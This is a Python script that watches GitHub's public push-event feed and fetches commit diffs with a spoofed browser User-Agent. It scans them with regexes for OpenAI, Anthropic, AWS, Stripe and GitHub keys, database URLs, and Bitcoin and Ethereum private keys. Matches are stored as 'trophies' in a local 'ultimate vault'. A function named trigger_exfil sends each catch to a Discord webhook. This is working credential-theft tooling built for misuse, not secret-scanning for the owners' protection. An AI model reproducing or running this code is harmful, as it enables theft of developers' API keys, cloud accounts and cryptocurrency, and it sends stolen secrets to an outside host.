import re
import asyncio
import os
import json
from collections import deque
from datetime import datetime

DISCORD_WEBHOOK = os.getenv("EXFIL_WEBHOOK_URL", "")
LOCAL_LOG_FILE = "/data/intercepts.jsonl"
ULTIMATE_VAULT_FILE = "/data/ultimate_vault.jsonl"

RECENT_CATCHES = deque(maxlen=40)
CURRENT_SCANS = deque(maxlen=25) 
SEEN_COMMITS = deque(maxlen=5000) 
STATS = {"total_scanned": 0, "total_caught": 0}

CONCURRENCY_LIMIT = asyncio.Semaphore(2)

TARGET_MATRIX = {
    "GEMINI_GOOGLE_AI": re.compile(r"AIza[0-9A-Za-z-_]{35}"),
    "OPENAI_SK": re.compile(r"sk-[a-zA-Z0-9]{48}"),
    "OPENAI_PROJ": re.compile(r"sk-proj-[a-zA-Z0-9_-]{48,}"),
    "DEEPSEEK_SK": re.compile(r"sk-[a-zA-Z0-9]{32}"),
    "ANTHROPIC_SK": re.compile(r"sk-ant-api03-[a-zA-Z0-9_-]{93}"),
    "GOOGLE_OAUTH": re.compile(r"ya29\.[a-zA-Z0-9_-]+"),
    "AWS_AKIA": re.compile(r"AKIA[0-9A-Z]{16}"),
    "AZURE_PAT": re.compile(r"vssps\.[a-zA-Z0-9]{32}"),
    "GCP_SERVICE_ACCOUNT": re.compile(r"\"type\":\s*\"service_account\""),
    "SMTP_URL": re.compile(r"(?:smtp|imap|pop3)s?://[^:]+:[^@]+@[^\s/]+"),
    "MAIL_CONFIG_PASS": re.compile(r"(?:MAIL|SMTP|EMAIL|POSTMARK)_(?:PASSWORD|PASS|KEY)[\s:=]+['\"]([^'\"]+)['\"]", re.IGNORECASE),
    "TWILIO_AUTH": re.compile(r"AC[a-f0-9]{32}"),
    "SENDGRID_API": re.compile(r"SG\.[a-zA-Z0-9_-]{22}\.[a-zA-Z0-9_-]{43}"),
    "DB_CONNECTION": re.compile(r"(?:postgres|mongodb(?:\+srv)?|mysql|redis):\/\/[^\s]+"),
    "BITCOIN_PRIV": re.compile(r"[5KL][1-9A-HJ-NP-Za-km-z]{50,51}"),
    "ETH_PRIVATE": re.compile(r"0x[a-fA-F0-9]{64}"),
    "GITHUB_PAT": re.compile(r"ghp_[a-zA-Z0-9]{36}"),
    "HEROKU_API": re.compile(r"[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}"),
    "STRIPE_LIVE": re.compile(r"(?:sk|rk)_live_[0-9a-zA-Z]{24,34}"),
    "RSA_PRIVATE": re.compile(r"-----BEGIN RSA PRIVATE KEY-----"),
    "GROQ_API": re.compile(r"gsk_[a-zA-Z0-9]{32,40}"),
    "HUGGINGFACE_TOKEN": re.compile(r"hf_[a-zA-Z0-9]{34}"),
    "IMAGGA_API": re.compile(r"(?i)(?:imagga)[_a-z]*(?:key|secret)[\s:=]+['\"]([a-zA-Z0-9_-]+)['\"]"),
    "DEEPAI_API": re.compile(r"(?i)deepai[_a-z]*key[\s:=]+['\"]([a-fA-F0-9-]{36})['\"]"),
    "RUNWAY_API": re.compile(r"(?i)runway[_a-z]*key[\s:=]+['\"]([a-zA-Z0-9_-]+)['\"]"),
    "IBM_WATSON_API": re.compile(r"(?i)(?:watson|ibm_cloud)[_a-z]*key[\s:=]+['\"]([a-zA-Z0-9_-]{44})['\"]"),
    "OPENROUTER_SK": re.compile(r"sk-or-v1-[a-zA-Z0-9]{64}"),
    "XAI_Grok_API": re.compile(r"xai-[a-zA-Z0-9\-_]{48,64}"),
    "PERPLEXITY_API": re.compile(r"pplx-[a-zA-Z0-9]{40,55}"),
    "FIREWORKS_API": re.compile(r"fw_[a-zA-Z0-9]{32,64}"), 
    "ELEVENLABS_API": re.compile(r"sk_[a-zA-Z0-9]{32}"),
}

CRITICAL_TYPES = [
    "GROQ_API", "HUGGINGFACE_TOKEN", "DEEPSEEK_SK", "OPENROUTER_SK", "XAI_Grok_API", "PERPLEXITY_API", "OPENAI_SK", "ANTHROPIC_SK", "OPENAI_PROJ"
]

def is_valid_trophy(s_type, secret):
    """Filters out low-entropy garbage and non-key UUIDs."""
    if secret.isdigit() and len(set(secret)) < 5: return False
    if len(set(secret)) < 8: return False
    if s_type == "AWS_AKIA": return len(secret) == 20
    if "OPENAI" in s_type: return secret.startswith("sk-") and len(secret) > 30
    if s_type == "BITCOIN_PRIV": return any(c.isalpha() for c in secret)
    if s_type == "HUGGINGFACE_TOKEN": return secret.startswith("hf_") and len(secret) == 37
    
    return True

def write_local_log(repo_name, display_url, secret_type, matched_string):
    """Routes to general log and performs 'promotion' to the Ultimate Vault."""
    try:
        os.makedirs(os.path.dirname(LOCAL_LOG_FILE), exist_ok=True)
        secret = matched_string.strip()
        log_entry = {
            "timestamp": datetime.utcnow().isoformat(),
            "type": secret_type,
            "repo": repo_name,
            "url": display_url,
            "secret": secret
        }
        entry_json = json.dumps(log_entry) + "\n"
        
        with open(LOCAL_LOG_FILE, "a") as f:
            f.write(entry_json)
            
        if secret_type in CRITICAL_TYPES and is_valid_trophy(secret_type, secret):
            print(f"💎 [ULTIMATE VAULT] {secret_type} captured from {repo_name}")
            with open(ULTIMATE_VAULT_FILE, "a") as f_ult:
                f_ult.write(entry_json)
                
    except Exception:
        pass

async def trigger_exfil(client, repo_name, display_url, secret_type, matched_string):
    if not DISCORD_WEBHOOK: return
    mask = matched_string.strip()[:50] + "..."
    payload = {"content": f"🚨 **SCRAPER CATCH** 🚨\n**Type:** `{secret_type}`\n**Repo:** {repo_name}\n**Commit:** {display_url}\n**Found:** ||`{mask}`||"}
    try: await client.post(DISCORD_WEBHOOK, json=payload, timeout=5.0)
    except Exception: pass

async def process_commit_diff(client, repo_name, display_url, raw_patch_url):
    CURRENT_SCANS.appendleft({"repo": repo_name, "url": display_url})
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)", "Accept": "text/plain"}
    
    type_counts = {t: 0 for t in TARGET_MATRIX.keys()}
    FLOOD_LIMIT = 5 

    async with CONCURRENCY_LIMIT:
        try:
            await asyncio.sleep(0.3) 
            resp = await client.get(raw_patch_url, headers=headers, timeout=8.0)
            if resp.status_code != 200: return
            
            diff_text = resp.text
            STATS["total_scanned"] += 1
            
            for secret_type, pattern in TARGET_MATRIX.items():
                for match in pattern.finditer(diff_text):
                    if type_counts[secret_type] >= FLOOD_LIMIT:
                        continue 

                    found_str = match.group(1) if pattern.groups > 0 else match.group(0)
                    type_counts[secret_type] += 1
                    STATS["total_caught"] += 1
                    
                    preview = (found_str[:5] + "..." + found_str[-5:] if len(found_str) > 10 else "***")
                    RECENT_CATCHES.appendleft({"type": secret_type, "repo": repo_name, "url": display_url, "preview": preview})
                    
                    write_local_log(repo_name, display_url, secret_type, found_str)
                    asyncio.create_task(trigger_exfil(client, repo_name, display_url, secret_type, found_str))
                    
        except Exception: pass

async def extract_and_scan_diffs(client, events):
    tasks = []
    push_count = sum(1 for e in events if e.get("type") == "PushEvent")
    if push_count > 0:
        print(f"[*] Firehose Pulse: {push_count} events. Analyzing...")

    for event in events:
        if event.get("type") == "PushEvent":
            repo_name = event.get("repo", {}).get("name")
            if not repo_name: continue
            payload = event.get("payload", {})
            
        
            all_shas = [payload.get("head")] + [c.get("sha") for c in payload.get("commits", [])]
            for sha in filter(None, all_shas):
                url = f"https://github.com/{repo_name}/commit/{sha}"
            
                if url not in SEEN_COMMITS:
                    SEEN_COMMITS.append(url)
                    tasks.append(process_commit_diff(client, repo_name, url, url + ".patch"))
                    
    if tasks: await asyncio.gather(*tasks)
    
